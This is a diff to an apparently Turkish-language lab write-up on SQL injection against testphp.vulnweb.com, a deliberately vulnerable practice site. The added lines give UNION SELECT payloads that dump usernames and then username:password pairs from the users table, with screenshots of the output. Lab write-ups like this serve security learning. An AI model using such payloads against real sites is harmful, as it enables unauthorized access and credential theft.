@@ -284,3 +284,23 @@ http://testphp.vulnweb.com/listproducts.php?cat=-99999%20union%20select%201,2,3,
 ```
 
 ![image](https://github.com/user-attachments/assets/ddeba672-4d73-409d-8175-2867d13e108f)
+
+'users' tablosundan uname'i sorguluyorum.
+
+```
+http://testphp.vulnweb.com/listproducts.php?cat=-1
+UNION SELECT 1,2,3,4,5,6,uname,8,9,10,11 FROM users
+```
+
+![image](https://github.com/user-attachments/assets/c53a4f27-25e4-42b5-8f43-ca3667029bba)
+
+Bu url'i yazdığımda users tablosundan öğrendiğim uname ve pass değerlerinin arasına adımı da yazdıyorum ki çıktı da rahatça ayırt edebileyim.
+
+```
+http://testphp.vulnweb.com/listproducts.php?cat=-1
+UNION SELECT 1,2,3,4,5,6,concat(uname,':samed:',pass),8,9,10,11 FROM users
+```
+
+![image](https://github.com/user-attachments/assets/7f4e42bd-3a6d-414f-8801-0469e70bbe3c)
+
+
